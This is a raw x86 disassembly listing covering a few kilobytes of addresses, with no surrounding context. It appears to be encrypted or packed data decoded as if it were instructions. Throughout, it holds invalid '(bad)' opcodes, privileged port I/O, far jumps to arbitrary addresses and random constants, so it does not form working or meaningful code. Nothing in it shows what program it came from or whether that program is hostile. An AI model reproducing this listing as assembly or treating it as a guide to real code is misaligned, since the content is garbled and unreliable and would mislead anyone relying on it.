  402916:	or     BYTE PTR [ecx+esi*4-0x5a],bh
  40291a:	dec    ebp
  40291b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40291c:	pushf  
  40291d:	or     DWORD PTR [edi],0x7ac9d997
  402923:	push   ebx
  402924:	popa   
  402925:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402926:	or     eax,0x1744af37
  40292b:	mov    ebx,0x87040baf
  402930:	(bad)  
  402932:	xchg   ebx,eax
  402933:	sub    BYTE PTR [esi+0x4d],cl
  402936:	push   0xffffffc1
  402938:	hlt    
  402939:	cmp    eax,0xf9f0e86d
  40293e:	cmp    eax,0x6039fd11
  402943:	pop    esp
  402944:	fsubr  st,st(0)
  402946:	lods   al,BYTE PTR ds:[esi]
  402947:	jge    0x40292c
  402949:	mov    bh,0x73
  40294b:	out    dx,al
  40294c:	pop    ebp
  40294d:	jb     0x402961
  40294f:	jnp    0x402901
  402951:	and    ebp,DWORD PTR [ebp+0x19]
  402954:	cld    
  402955:	push   ebp
  402956:	and    ah,BYTE PTR [ebx+0x4eb88d18]
  40295c:	jmp    0x402990
  40295e:	adc    cl,BYTE PTR [edi+0x51]
  402961:	pop    esi
  402962:	(bad)  
  402963:	push   esp
  402964:	cmp    ebp,DWORD PTR [edi]
  402966:	push   0x9
  402968:	ja     0x4029ba
  40296a:	jae    0x4028fe
  40296c:	xor    ah,BYTE PTR [edx+0x3da2d98d]
  402972:	push   ds
  402973:	sub    DWORD PTR [ecx+0x14],ebx
  402976:	pop    ebp
  402977:	jmp    0x56098fd4
  40297c:	repnz rcr BYTE PTR [esi],1
  40297f:	dec    ebx
  402980:	or     eax,0x48d1687b
  402985:	std    
  402986:	div    BYTE PTR [ecx]
  402988:	div    DWORD PTR [ebx+eax*2-0x8]
  40298c:	sti    
  40298d:	cs hlt 
  40298f:	rcl    dh,cl
  402991:	mov    ebp,es
  402993:	dec    edx
  402994:	jecxz  0x4029e9
  402996:	or     al,0x90
  402998:	pop    ebp
  402999:	imul   eax,DWORD PTR gs:[ebx-0x2ce5d87c],0x36
  4029a1:	ret    
  4029a2:	inc    edx
  4029a3:	xor    ah,dl
  4029a5:	int3   
  4029a6:	clc    
  4029a7:	fadd   QWORD PTR [edi-0x51d6ed7]
  4029ad:	pop    esi
  4029ae:	xchg   edx,eax
  4029af:	push   0x910ba789
  4029b4:	adc    BYTE PTR [edx+eiz*4+0x76],bh
  4029b8:	lods   al,BYTE PTR ds:[esi]
  4029b9:	sub    edx,esp
  4029bb:	imul   cl
  4029bd:	mov    esp,0x7de5b669
  4029c2:	stos   DWORD PTR es:[edi],eax
  4029c3:	retf   
  4029c4:	xor    al,0x8a
  4029c6:	gs mov eax,0x34bd6887
  4029cc:	jp     0x4029d0
  4029ce:	fwait
  4029cf:	xor    cl,dl
  4029d1:	(bad)  
  4029d2:	rcr    DWORD PTR [ebx+0x2578bede],cl
  4029d8:	loopne 0x402a11
  4029da:	pop    eax
  4029db:	leave  
  4029dc:	sub    al,0xc3
  4029de:	pop    ebx
  4029df:	or     DWORD PTR [edi+0x3b],0x4ab5c8bb
  4029e6:	ret    0x15d3
  4029e9:	fs icebp 
  4029eb:	mov    dl,0xcb
  4029ed:	call   0xa7f28161
  4029f2:	mov    ecx,0x8b3382db
  4029f7:	mov    ah,0x88
  4029f9:	push   0xfd4f8e
  4029fe:	mov    ecx,0xf993d90e
  402a03:	mov    esp,ecx
  402a05:	push   ss
  402a06:	and    WORD PTR [eax],dx
  402a09:	mov    bl,0x88
  402a0b:	and    BYTE PTR [ebx],cl
  402a0d:	fisttp WORD PTR [edx]
  402a0f:	mov    cl,0x19
  402a11:	push   ds
  402a12:	jne    0x402a03
  402a14:	jg     0x4029c8
  402a16:	and    edi,DWORD PTR [ebx+ebp*1]
  402a19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a1a:	xchg   DWORD PTR [esi-0x1026025f],esp
  402a20:	adc    DWORD PTR [esi-0x56],ebp
  402a23:	clc    
  402a24:	aad    0x6c
  402a26:	xchg   ecx,eax
  402a27:	xchg   ebx,eax
  402a28:	add    esi,ebp
  402a2a:	pushf  
  402a2b:	je     0x402a8d
  402a2d:	adc    ebp,ecx
  402a2f:	sub    esi,DWORD PTR [esi+0x4b]
  402a32:	cwde   
  402a33:	cmp    esi,ebp
  402a35:	xchg   edi,eax
  402a36:	mov    ebp,0x58d1bde
  402a3b:	ds lock mov eax,0x664101ab
  402a42:	out    0x90,al
  402a44:	fistp  QWORD PTR [ecx+0x79b81e25]
  402a4a:	cmc    
  402a4b:	mov    bh,0x60
  402a4d:	sub    al,BYTE PTR [esi+ebp*1-0x2b]
  402a51:	fsub   QWORD PTR [esi]
  402a53:	aad    0x9a
  402a55:	dec    edi
  402a56:	sar    al,cl
  402a58:	sub    DWORD PTR [eax+0x67],ebx
  402a5b:	or     BYTE PTR [edx],bl
  402a5d:	mov    ch,0xf2
  402a5f:	and    BYTE PTR [ebp+0x54646972],bl
  402a65:	das    
  402a66:	inc    ecx
  402a67:	fwait
  402a68:	pop    es
  402a69:	inc    ebx
  402a6a:	fisttp WORD PTR [ecx]
  402a6c:	pop    esp
  402a6d:	xor    dh,BYTE PTR [ebp+0x4e]
  402a70:	add    BYTE PTR [edi+0x584cf5a9],dh
  402a76:	pop    edi
  402a77:	sar    BYTE PTR [edi-0x5c30e854],cl
  402a7d:	sbb    dl,0xc
  402a80:	fld    DWORD PTR [edx+0xb84daa2]
  402a86:	and    al,0x6e
  402a88:	add    eax,0x99d87b99
  402a8d:	fbstp  TBYTE PTR ds:0x4de7d6ed
  402a93:	adc    DWORD PTR [esi-0x5b],eax
  402a96:	in     eax,0x1a
  402a98:	sub    eax,0xf4b7207f
  402a9d:	mov    ch,0x4c
  402a9f:	pop    ebp
  402aa0:	pushf  
  402aa1:	push   edi
  402aa2:	les    ecx,FWORD PTR [ebp-0x6772c89c]
  402aa8:	(bad)  
  402aaa:	push   eax
  402aab:	pop    ss
  402aac:	jge    0x402a95
  402aae:	shr    ebx,0xa2
  402ab1:	and    ebx,DWORD PTR [edx]
  402ab3:	shr    BYTE PTR [ebx+ebp*4],0xe6
  402ab7:	test   BYTE PTR [ecx-0x3058e4f],ah
  402abd:	sbb    esi,ebx
  402abf:	push   edi
  402ac0:	xchg   ecx,eax
  402ac1:	mov    al,ds:0xb58d43ae
  402ac6:	in     eax,dx
  402ac7:	cmp    BYTE PTR [edi-0x5d],0xda
  402acb:	call   0xd13e7272
  402ad0:	in     eax,0xa
  402ad2:	inc    edx
  402ad3:	mov    bl,0xb4
  402ad5:	ret    0x1feb
  402ad8:	cld    
  402ad9:	mov    DWORD PTR ds:0x51effd8a,esi
  402adf:	mov    ch,0x86
  402ae1:	mov    al,ds:0x3f605f8a
  402ae6:	xchg   ecx,eax
  402ae7:	or     ecx,DWORD PTR [ebp-0x6f4f97dc]
  402aed:	hlt    
  402aee:	mov    WORD PTR [edx-0x3f],fs
  402af1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402af2:	sbb    ebp,esi
  402af4:	pop    ds
  402af5:	icebp  
  402af6:	int3   
  402af7:	push   edx
  402af8:	outs   dx,DWORD PTR ds:[esi]
  402af9:	jno    0x402b0f
  402afb:	sbb    ch,BYTE PTR [ebx+ecx*1+0x77]
  402aff:	xchg   ebx,eax
  402b00:	add    esi,DWORD PTR [ebp+0x49]
  402b03:	mov    edi,0x86b38a70
  402b08:	add    eax,0xbbd50fbe
  402b0d:	lods   eax,DWORD PTR ds:[esi]
  402b0e:	fwait
  402b0f:	jne    0x402b8c
  402b11:	adc    DWORD PTR [eax+0x3d],esi
  402b14:	inc    ecx
  402b15:	dec    esi
  402b16:	std    
  402b17:	adc    ch,BYTE PTR [esi]
  402b19:	mov    ds:0x368d86d8,eax
  402b1e:	imul   ebx,DWORD PTR [ebx],0xa604280
  402b24:	ins    DWORD PTR es:[edi],dx
  402b25:	jecxz  0x402aad
  402b27:	mov    ch,0x4f
  402b29:	and    al,BYTE PTR ds:0xf2105716
  402b2f:	retf   0x80d
  402b32:	and    al,0xed
  402b34:	cdq    
  402b35:	jmp    0x402ae7
  402b37:	js     0x402b7b
  402b39:	xor    cl,dl
  402b3b:	push   edi
  402b3c:	or     eax,0xea5e30ad
  402b41:	(bad)  
  402b42:	stos   DWORD PTR es:[edi],eax
  402b43:	call   0xfa6:0xba499b8d
  402b4a:	(bad)
  402b4d:	in     al,0xd3
  402b4f:	sbb    BYTE PTR [esi],0x4d
  402b52:	(bad)  
  402b53:	cmp    DWORD PTR [eax],ecx
  402b55:	mov    dh,0xa0
  402b57:	push   ss
  402b58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b59:	push   edx
  402b5a:	add    BYTE PTR [eax-0x499ceb4c],al
  402b60:	mov    ?,WORD PTR [esi]
  402b62:	mov    DWORD PTR fs:[ecx],edx
  402b65:	push   esp
  402b66:	aaa    
  402b67:	push   ecx
  402b68:	lds    edi,FWORD PTR [edi+ecx*2-0x2c]
  402b6c:	loope  0x402b72
  402b6e:	pop    ds
  402b6f:	in     eax,dx
  402b70:	sbb    edi,eax
  402b72:	sub    al,0xbc
  402b74:	daa    
  402b75:	adc    DWORD PTR [edx],eax
  402b77:	mov    DWORD PTR [ebp+0x0],esi
  402b7a:	mov    al,0x6d
  402b7c:	(bad)  
  402b7d:	in     eax,dx
  402b7e:	or     esi,DWORD PTR [esi-0x6]
  402b81:	(bad)
  402b85:	adc    eax,0x4712c72f
  402b8a:	ss mov bh,dl
  402b8d:	xor    esi,DWORD PTR [edx]
  402b8f:	js     0x402b5b
  402b91:	adc    eax,esi
  402b93:	test   eax,0xbba2ac30
  402b98:	jno    0x402b62
  402b9a:	and    al,0x5e
  402b9c:	mov    edi,DWORD PTR [ebp+ebp*1+0x46]
  402ba0:	loope  0x402c20
  402ba2:	sbb    bh,BYTE PTR [eax-0x1880194c]
  402ba8:	fsub   QWORD PTR [edi+eax*8]
  402bab:	push   cs
  402bac:	inc    ebp
  402bad:	ins    DWORD PTR es:[edi],dx
  402bae:	pop    edx
  402baf:	inc    ebp
  402bb0:	push   edi
  402bb1:	inc    ebp
  402bb2:	or     DWORD PTR [ecx],edi
  402bb4:	scas   eax,DWORD PTR es:[edi]
  402bb5:	pop    edx
  402bb6:	shl    DWORD PTR [ebx-0x4ea79489],cl
  402bbc:	dec    ebp
  402bbd:	jecxz  0x402c1d
  402bbf:	lods   al,BYTE PTR ds:[esi]
  402bc0:	or     DWORD PTR ss:[ecx-0xf4b136b],0xffffffb9
  402bc8:	jne    0x402bf4
  402bca:	pop    edx
  402bcb:	mov    ebx,0x874d1f41
  402bd0:	and    DWORD PTR [eax],ecx
  402bd2:	mov    WORD PTR [ecx-0x708e3f14],?
  402bd8:	sbb    al,0xb7
  402bda:	mov    BYTE PTR [eax-0x64],dh
  402bdd:	inc    edi
  402bde:	sub    al,0xcf
  402be0:	ret    
  402be1:	push   ebp
  402be2:	push   esp
  402be3:	cli    
  402be4:	int3   
  402be5:	cs pop eax
  402be7:	sbb    dl,bl
  402be9:	jmp    0x402bb0
  402beb:	jmp    0x402b70
  402bed:	mov    ds:0x58fc94cc,al
  402bf2:	jmp    0x402b99
  402bf4:	cmp    al,BYTE PTR [ebx-0x44]
  402bf7:	jns    0x402c2d
  402bf9:	push   ds
  402bfa:	mov    ebx,DWORD PTR [ecx+0x536d8b0c]
  402c00:	mov    BYTE PTR [esi+0x6a],dh
  402c03:	mov    DWORD PTR [edi+0x4286cd6c],ecx
  402c09:	dec    esp
  402c0a:	inc    ebp
  402c0b:	addr16 jno 0x402bbe
  402c0e:	mov    cx,0xc48e
  402c12:	fwait
  402c13:	mov    bl,0xd7
  402c15:	stos   DWORD PTR es:[edi],eax
  402c16:	adc    eax,DWORD PTR [ebx+0x46012595]
  402c1c:	mov    ch,al
  402c1e:	loop   0x402bc3
  402c20:	retf   
  402c21:	mov    edi,0x522d332e
  402c26:	repnz call 0xaa57:0x2e7bd144
  402c2e:	ror    ecx,cl
  402c30:	rcl    DWORD PTR [ecx+0x53607a2d],cl
  402c36:	out    dx,eax
  402c37:	out    dx,eax
  402c38:	ins    DWORD PTR es:[edi],dx
  402c39:	or     al,0x70
  402c3b:	popa   
  402c3c:	xor    ah,dl
  402c3e:	xor    esi,edi
  402c40:	mov    dl,0x6f
  402c42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c43:	mov    eax,DWORD PTR [ecx]
  402c45:	mov    DWORD PTR [ecx-0x47db0187],edi
  402c4b:	jb     0x402bea
  402c4d:	dec    edx
  402c4e:	out    dx,eax
  402c4f:	fdiv   st(4),st
  402c51:	popf   
  402c52:	adc    ah,bh
  402c54:	and    BYTE PTR [eax-0x77642ff4],al
  402c5a:	pop    esp
  402c5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c5c:	cs xchg edx,eax
  402c5e:	jne    0x402c67
  402c60:	inc    eax
  402c61:	jo     0x402c34
  402c63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c64:	aas    
  402c65:	and    DWORD PTR ds:0xa7c4afe4,ebx
  402c6b:	sbb    al,0xb2
  402c6d:	mov    ah,0x9c
  402c6f:	jmp    0xdc808e20
  402c74:	aaa    
  402c75:	lahf   
  402c76:	pop    ds
  402c77:	xchg   esp,eax
  402c78:	jno    0x402cee
  402c7a:	cmp    dl,BYTE PTR [esp+ebx*4]
  402c7d:	loopne 0x402c46
  402c7f:	lea    edi,[edx+0x69]
  402c82:	cmp    ebp,DWORD PTR [ebx-0x16]
  402c85:	or     ebp,DWORD PTR [edx]
  402c87:	frstor [ebx]
  402c89:	inc    ecx
  402c8a:	in     al,0x94
  402c8c:	retf   0x64bc
  402c8f:	fs adc al,0x22
  402c92:	jmp    0x402c71
  402c94:	lea    esi,[ebp+0x6ce10e05]
  402c9a:	sbb    bl,cl
  402c9c:	mov    ebx,0x1f36cf30
  402ca1:	xlat   BYTE PTR ds:[ebx]
  402ca2:	ja     0x402cf8
  402ca4:	es in  al,0x71
  402ca7:	and    DWORD PTR [ecx-0x31],esi
  402caa:	xadd   DWORD PTR [edx-0x54118242],esi
  402cb1:	lea    eax,[edi-0x137cd332]
  402cb7:	adc    BYTE PTR [edi-0x1ff676b6],ah
  402cbd:	cmp    al,0x91
  402cbf:	shl    BYTE PTR [edx+0x30],0xc8
  402cc3:	ja     0x402c79
  402cc5:	jne    0xdbe4e99a
  402ccb:	clc    
  402ccc:	arpl   WORD PTR [ebx+0x3da98119],sp
  402cd2:	mov    al,0x2a
  402cd4:	push   ebx
  402cd5:	test   DWORD PTR [eax],eax
  402cd7:	inc    ebx
  402cd8:	dec    BYTE PTR [esi+0x5bf80704]
  402cde:	sbb    DWORD PTR [esi+0x6a],ebp
  402ce1:	arpl   dx,di
  402ce3:	mov    ah,0xc6
  402ce5:	push   0x642d5cfb
  402cea:	loop   0x402c9d
  402cec:	ror    DWORD PTR [edx-0x19105ab8],1
  402cf2:	inc    esi
  402cf3:	(bad)  
  402cf4:	jle    0x402c99
  402cf6:	sbb    eax,DWORD PTR [ecx-0x64]
  402cf9:	mov    esp,0xa804fc0f
  402cfe:	rcl    BYTE PTR [ecx],0x43
  402d01:	nop
  402d02:	je     0x402d1b
  402d04:	mov    edi,0xcdbf6f0
  402d09:	add    BYTE PTR [edx-0x1c],0x60
  402d0d:	dec    ecx
  402d0e:	in     eax,dx
  402d0f:	(bad)  
  402d11:	je     0x402d2c
  402d13:	(bad)
  402d16:	icebp  
  402d17:	shl    al,0xa4
  402d1a:	sub    BYTE PTR [ebp-0x3e3415d6],ch
  402d20:	pop    es
  402d21:	rcr    DWORD PTR [ebx],1
  402d23:	inc    edi
  402d24:	sar    BYTE PTR [edx+0x5cb10f4d],0x77
  402d2b:	add    esp,edi
  402d2d:	dec    edx
  402d2e:	rcr    DWORD PTR [edx+edi*1+0x41898385],cl
  402d35:	int3   
  402d36:	inc    ecx
  402d37:	pop    eax
  402d38:	mov    ebx,0x544a764c
  402d3d:	fnstcw WORD PTR [eax-0xd95d556]
  402d43:	or     eax,0xa0ff4c99
  402d48:	retf   0x1a4d
  402d4b:	jecxz  0x402cde
  402d4d:	es in  eax,dx
  402d4f:	and    DWORD PTR [esi-0x27],eax
  402d52:	mov    cl,0x6b
  402d54:	cmc    
  402d55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d56:	cmp    edx,DWORD PTR [ebp-0x6a]
  402d59:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  402d5b:	jge    0x402cf6
  402d5d:	mov    DWORD PTR [esi],eax
  402d5f:	sbb    eax,0x9f74a0e0
  402d64:	push   DWORD PTR [esi-0x4eac1ca9]
  402d6a:	(bad)  
  402d6b:	mov    cl,0xe2
  402d6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d6e:	sub    DWORD PTR [ebx],edx
  402d70:	dec    edx
  402d71:	test   DWORD PTR [edx],ebx
  402d73:	std    
  402d74:	fist   WORD PTR [edx+ebx*4]
  402d77:	jbe    0x402db5
  402d79:	mov    gs,WORD PTR ds:0x455f56a9
  402d7f:	mov    edi,0xd775b12f
  402d84:	sub    al,0x7e
  402d86:	push   esi
  402d87:	loope  0x402d41
  402d89:	or     BYTE PTR [esp+edi*2+0x7f],cl
  402d8d:	les    ebx,FWORD PTR [edx]
  402d8f:	pop    edi
  402d90:	and    BYTE PTR [esi+0x129e3173],0xed
  402d97:	add    al,BYTE PTR [ebx-0x178ce98d]
  402d9d:	push   esp
  402d9e:	js     0x402d6e
  402da0:	arpl   WORD PTR [ecx+ebx*8+0x68],cx
  402da4:	imul   ecx,DWORD PTR [eax+edx*8+0x16a0cd53],0xffffffda
  402dac:	scas   eax,DWORD PTR es:[edi]
  402dad:	(bad)  
  402dae:	icebp  
  402daf:	out    dx,al
  402db0:	loope  0x402d64
  402db2:	mov    al,ds:0x319d098c
  402db7:	mov    al,0x71
  402db9:	mov    dl,0xfa
  402dbb:	xor    BYTE PTR [ebx-0x30],0x68
  402dbf:	test   al,0xcf
  402dc1:	aaa    
  402dc2:	fwait
  402dc3:	out    dx,eax
  402dc4:	sahf   
  402dc5:	mov    edi,0xcbc90dca
  402dca:	add    eax,0x877057d0
  402dcf:	xchg   ecx,eax
  402dd0:	sub    ebx,edx
  402dd2:	dec    edi
  402dd3:	(bad)  
  402dd4:	out    dx,eax
  402dd5:	ja     0x402e44
  402dd7:	xchg   esp,eax
  402dd8:	jle    0x402e0e
  402dda:	xor    al,0x5d
  402ddc:	inc    ebx
  402ddd:	fs ret 0x5c33
  402de1:	jge    0x402dfc
  402de3:	call   0x3aa2d2eb
  402de8:	test   DWORD PTR [esi-0x2e],esp
  402deb:	xor    BYTE PTR [eax],dh
  402ded:	mov    eax,ds:0x646e0638
  402df2:	(bad)  
  402df3:	sti    
  402df4:	jae    0x402d9e
  402df6:	jg     0x402e6b
  402df8:	xor    al,0xa0
  402dfa:	and    ah,dl
  402dfc:	dec    ecx
  402dfd:	xchg   edi,eax
  402dfe:	pop    esi
  402dff:	add    dl,BYTE PTR [eax+0x42]
  402e02:	jge    0x402df7
  402e04:	int3   
  402e05:	call   0x54f7:0x9dacd321
  402e0c:	mov    esi,edi
  402e0e:	dec    ecx
  402e0f:	sbb    BYTE PTR [ebp-0x80],bl
  402e12:	lods   al,BYTE PTR ds:[esi]
  402e13:	clc    
  402e14:	lock cmp esp,eax
  402e17:	mov    al,0xe8
  402e19:	in     eax,0xa
  402e1b:	out    dx,eax
  402e1c:	pop    es
  402e1d:	or     DWORD PTR [edx+0x0],ebx
  402e20:	scas   eax,DWORD PTR es:[edi]
  402e21:	pop    es
  402e22:	ins    BYTE PTR es:[edi],dx
  402e23:	nop
  402e24:	fisttp QWORD PTR [eax]
  402e26:	cmc    
  402e27:	cmp    ebp,eax
  402e29:	aad    0x55
  402e2b:	mov    ss,WORD PTR [edi]
  402e2d:	ja     0x402e3a
  402e2f:	or     BYTE PTR [eax+0x770aa6bc],al
  402e35:	xchg   ecx,eax
  402e36:	std    
  402e37:	cmp    eax,0x73a8c8b3
  402e3c:	inc    ecx
  402e3d:	(bad)  
  402e3e:	mov    esi,0x1254bdca
  402e43:	and    DWORD PTR [ecx+0x426e2031],eax
  402e49:	lods   eax,DWORD PTR ds:[esi]
  402e4a:	into   
  402e4b:	pop    ebp
  402e4c:	lods   al,BYTE PTR ds:[esi]
  402e4d:	xor    al,0x1f
  402e4f:	out    dx,eax
  402e50:	dec    esp
  402e51:	out    0x1,eax
  402e53:	mov    al,ds:0x7bfcfa1b
  402e58:	adc    al,0xb6
  402e5a:	data16 jge 0x402e0e
  402e5d:	mov    DWORD PTR [ebx],ebx
  402e5f:	xor    al,BYTE PTR [ebp-0x28]
  402e62:	jmp    0x454af038
  402e67:	shr    BYTE PTR [ecx+0x1c2808a2],cl
  402e6d:	scas   al,BYTE PTR es:[edi]
  402e6e:	sahf   
  402e6f:	add    esp,0x29
  402e72:	dec    ebx
  402e73:	or     DWORD PTR [eax+0x533fd3d2],eax
  402e79:	test   eax,0xf3932417
  402e7e:	out    0xcb,al
  402e80:	mov    edi,0xa0b151da
  402e85:	div    DWORD PTR [ebp+0x55]
  402e88:	xchg   DWORD PTR [edx],esi
  402e8a:	and    edi,DWORD PTR [esp+eiz*8+0x3f]
  402e8e:	jmp    0x402ecc
  402e90:	cmc    
  402e91:	cwde   
  402e92:	out    0x73,eax
  402e94:	(bad)  
  402e96:	rcr    DWORD PTR [ebp+0x10],1
  402e99:	mov    esi,0xd65d037a
  402e9e:	icebp  
  402e9f:	jmp    0x402e8c
  402ea1:	inc    edi
  402ea2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ea3:	fs push es
  402ea5:	jne    0x402ea0
  402ea7:	lea    esp,[edx-0xb2d062b]
  402ead:	test   al,0x97
  402eaf:	dec    edi
  402eb0:	into   
  402eb1:	call   0x9ce3820d
  402eb6:	jle    0x402f1e
  402eb8:	xchg   edx,eax
  402eb9:	neg    cl
  402ebb:	add    al,BYTE PTR [ecx+ebp*8+0x6e]
  402ebf:	mov    dh,0xbf
  402ec1:	xchg   esp,eax
  402ec2:	xor    BYTE PTR [eax+0x44],bl
  402ec5:	add    eax,esi
  402ec7:	mov    ebx,0x90d69218
  402ecc:	pop    eax
  402ecd:	mov    bh,BYTE PTR ds:0xbc2041bf
  402ed3:	mov    cl,0xc3
  402ed5:	xchg   ebx,eax
  402ed6:	xchg   edi,eax
  402ed7:	retf   0x11fe
  402eda:	adc    ah,BYTE PTR [edi-0x41332dfe]
  402ee0:	jmp    0xef105e55
  402ee5:	ins    DWORD PTR es:[edi],dx
  402ee6:	in     al,0xa3
  402ee8:	js     0x402e6f
  402eea:	jge    0x402f30
  402eec:	xchg   esi,eax
  402eed:	enter  0x2727,0x17
  402ef1:	jno    0x402e98
  402ef3:	jbe    0x402f73
  402ef5:	push   esp
  402ef6:	and    al,BYTE PTR [ebx-0x3c]
  402ef9:	push   ebx
  402efa:	inc    edi
  402efb:	lahf   
  402efc:	sub    edi,DWORD PTR [ebx-0x42f029c8]
  402f02:	ss mov dl,0xd8
  402f05:	gs inc ecx
  402f07:	aad    0xe4
  402f09:	push   0x7e
  402f0b:	dec    DWORD PTR [ebx+0x74]
  402f0e:	js     0x402ea8
  402f10:	aam    0x3e
  402f12:	pop    ecx
  402f13:	div    edx
  402f15:	imul   ecx,edi,0x295df919
  402f1b:	adc    DWORD PTR [ebx],ebx
  402f1d:	xor    DWORD PTR [ecx],0xdd1cb373
  402f23:	mov    WORD PTR [ecx+0x497c2d3a],?
  402f29:	dec    edi
  402f2a:	push   eax
  402f2b:	and    al,0xd8
  402f2d:	jno    0x402eed
  402f2f:	call   0x2426:0xc1ba151e
  402f36:	inc    eax
  402f37:	add    eax,0x4169f944
  402f3c:	or     edx,DWORD PTR [ebx+0x24]
  402f3f:	shl    DWORD PTR [ebx-0x1e],1
  402f42:	inc    ecx
  402f43:	stc    
  402f44:	or     ebp,ebp
  402f46:	pop    ecx
  402f47:	test   eax,0x59d8704b
  402f4c:	loopne 0x402f2a
  402f4e:	adc    esp,DWORD PTR [ecx]
  402f50:	cmp    ebx,DWORD PTR [eax-0x603ec5af]
  402f56:	stos   BYTE PTR es:[edi],al
  402f57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f58:	cmp    al,0xc7
  402f5a:	mov    al,0x4b
  402f5c:	dec    ecx
  402f5d:	cmp    BYTE PTR [esi-0x37],cl
  402f60:	sub    BYTE PTR [ecx-0x305491ce],ch
  402f66:	sar    DWORD PTR [esi+0x29],cl
  402f69:	rol    BYTE PTR [edx-0x564e0e11],cl
  402f6f:	cdq    
  402f70:	xchg   ebx,eax
  402f71:	xchg   edx,eax
  402f72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f73:	push   edi
  402f74:	cdq    
  402f75:	loop   0x402f86
  402f77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f78:	push   ecx
  402f79:	sti    
  402f7a:	xchg   ebp,eax
  402f7b:	fs shr edi,1
  402f7e:	sbb    DWORD PTR ds:0x57185f58,esp
  402f84:	or     BYTE PTR [edi+0x181ca2],dl
  402f8a:	fcom   st(5)
  402f8c:	lahf   
  402f8d:	push   esp
  402f8e:	in     al,0x72
  402f90:	imul   ebx,DWORD PTR [ebx+0x5c],0xabe890db
  402f97:	xchg   ecx,eax
  402f98:	rcr    DWORD PTR [ebx],0xcf
  402f9b:	jae    0x402f4a
  402f9d:	push   ebp
  402f9e:	mov    eax,ds:0xc1a41f59
  402fa3:	mov    BYTE PTR [esi-0x3a],ch
  402fa6:	(bad)  
  402fa7:	cmp    eax,0x8d017398
  402fac:	std    
  402fad:	fldenv gs:[esi-0x1e]
  402fb1:	retf   
  402fb2:	ret    0xcc0a
  402fb5:	(bad)  
  402fb6:	and    BYTE PTR [edi],bh
  402fb8:	adc    bl,dh
  402fba:	push   cs
  402fbb:	inc    BYTE PTR [esi+0x44]
  402fbe:	add    bl,BYTE PTR ds:0x615f43ec
  402fc4:	sub    edi,DWORD PTR [edi]
  402fc6:	fstp   TBYTE PTR [esp+edx*8]
  402fc9:	mov    ch,0xf7
  402fcb:	or     edi,ebx
  402fcd:	pop    ss
  402fce:	or     dl,BYTE PTR [ebx+0x32]
  402fd1:	adc    esp,DWORD PTR [esi*1+0x7b84a9a3]
  402fd8:	push   esi
  402fd9:	mov    al,ds:0x7e617ee5
  402fde:	sbb    BYTE PTR [eax+0x61993dbe],ah
  402fe4:	(bad)  
  402fe5:	or     al,0xd1
  402fe7:	es popf 
  402fe9:	xchg   ecx,eax
  402fea:	jmp    0x57ea:0x5f266e26
  402ff1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ff2:	jp     0x402ff1
  402ff4:	jle    0x402f7f
  402ff6:	and    BYTE PTR [ebx-0x57],al
  402ff9:	xlat   BYTE PTR ds:[ebx]
  402ffa:	sub    al,0x3d
  402ffc:	imul   ecx,ebp,0x44f73ce2
  403002:	aas    
  403003:	adc    ebx,DWORD PTR [esi+ebp*1]
  403006:	push   ecx
  403007:	fidiv  DWORD PTR [edi-0x4c]
  40300a:	sbb    ebp,DWORD PTR [esi+0xf]
  40300d:	or     dl,dl
  40300f:	cmp    dh,bl
  403011:	and    DWORD PTR [eax*1-0x5a117b5e],ecx
  403018:	pop    es
  403019:	jns    0x403041
  40301b:	retf   0x2771
  40301e:	repz or DWORD PTR [edx+0x46],ebx
  403022:	fld    QWORD PTR [esi]
  403024:	inc    eax
  403025:	fwait
  403026:	inc    edx
  403027:	lea    ebp,[edi]
  403029:	jl     0x403019
  40302b:	xor    DWORD PTR [esi],ecx
  40302d:	add    DWORD PTR [esi],edx
  40302f:	mov    al,ds:0x84ff2eb6
  403034:	mov    esi,0xe7dc4a62
  403039:	shl    BYTE PTR [ebx+0x61],1
  40303c:	jae    0x40308e
  40303e:	sub    BYTE PTR [edx-0x4621c64],ah
  403044:	frstor [ebp+0x26167815]
  40304a:	sub    DWORD PTR [edi+0x15eefcf9],edi
  403050:	mov    ds:0xc6114b96,eax
  403055:	out    dx,eax
  403056:	jb     0x403032
  403058:	loope  0x403025
  40305a:	pop    ebp
  40305b:	mov    WORD PTR [edi+0x2154c208],cs
  403061:	in     eax,dx
  403062:	xchg   edx,eax
  403063:	add    DWORD PTR [esi],0xe3327277
  403069:	jl     0x40301a
  40306b:	inc    esi
  40306c:	je     0x4030ea
  40306e:	mov    eax,ds:0xfeec4c24
  403073:	pop    es
  403074:	or     esp,DWORD PTR [edx]
  403076:	in     al,dx
  403077:	lock stos DWORD PTR es:[edi],eax
  403079:	mov    edi,0x428677a
  40307e:	jmp    0xd4bb:0x55af5d2f
  403085:	jo     0x40305e
  403087:	cmp    eax,0x3f289c15
  40308c:	mov    bh,0x90
  40308e:	inc    ebx
  40308f:	push   ebx
  403090:	in     al,dx
  403091:	xchg   esp,eax
  403092:	jnp    0x40309b
  403094:	pushf  
  403095:	fs pop es
  403097:	add    al,0xbf
  403099:	xor    al,0xb4
  40309b:	loope  0x4030fe
  40309d:	pop    esi
  40309e:	sub    DWORD PTR [ebx+ebx*4],0x1
  4030a2:	jb     0x403064
  4030a4:	repnz cmp DWORD PTR [edi+0x6c],0xdd81fd29
  4030ac:	fisub  WORD PTR [ebx]
  4030ae:	ret    0x2fd7
  4030b1:	jmp    0x40306c
  4030b3:	jo     0x3bbe2557
  4030b9:	jecxz  0x4030a6
  4030bb:	bound  edi,QWORD PTR ds:0xd723c3a5
  4030c1:	add    DWORD PTR [ecx-0x3c803cf3],ecx
  4030c7:	jae    0x40305d
